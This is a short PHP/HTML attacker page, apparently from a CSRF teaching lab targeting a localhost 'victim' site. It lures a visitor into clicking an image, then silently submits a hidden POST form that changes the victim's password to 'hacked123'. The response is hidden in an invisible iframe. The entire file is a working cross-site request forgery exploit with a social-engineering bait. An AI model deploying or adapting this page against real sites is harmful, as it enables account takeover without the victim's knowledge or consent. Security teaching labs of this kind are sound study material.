<?php
$target = 'http://victim.localhost/CSRF/post/zrtva/index.php';
$newPassword = 'hacked123';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Napadač (CSRF POST)</title>
    <link rel="stylesheet" href="../../style.css">
    <style>
        .note { font-size: 14px; color: #444; }
    </style>
</head>
<body>
<h1>Napadač — CSRF POST</h1>

<div class="card">
    <div class="img-frame">
        <img id="bait" src="image.jpeg" alt="Klikni na sliku" title="Klikni za fullscreen">
    </div>
</div>

<div id="overlay" class="overlay" style="display:none;">
    <span id="closeOverlay" class="close">&#10005;</span>
    <img src="image.jpeg" alt="Full image">
</div>

<form id="attackForm" method="POST" action="<?php echo htmlspecialchars($target, ENT_QUOTES, 'UTF-8'); ?>" target="hidden_iframe">
    <input type="hidden" name="action" value="change_password">
    <input type="hidden" name="new_password" value="<?php echo htmlspecialchars($newPassword, ENT_QUOTES, 'UTF-8'); ?>">
</form>
<iframe name="hidden_iframe" style="display:none;"></iframe>

<script>
const img = document.getElementById('bait');
const overlay = document.getElementById('overlay');
const closeOverlay = document.getElementById('closeOverlay');

img.addEventListener('click', () => {
    overlay.style.display = 'flex';
    setTimeout(() => document.getElementById('attackForm').submit(), 150);
});
closeOverlay.addEventListener('click', () => {
    overlay.style.display = 'none';
});
</script>
</body>
</html>
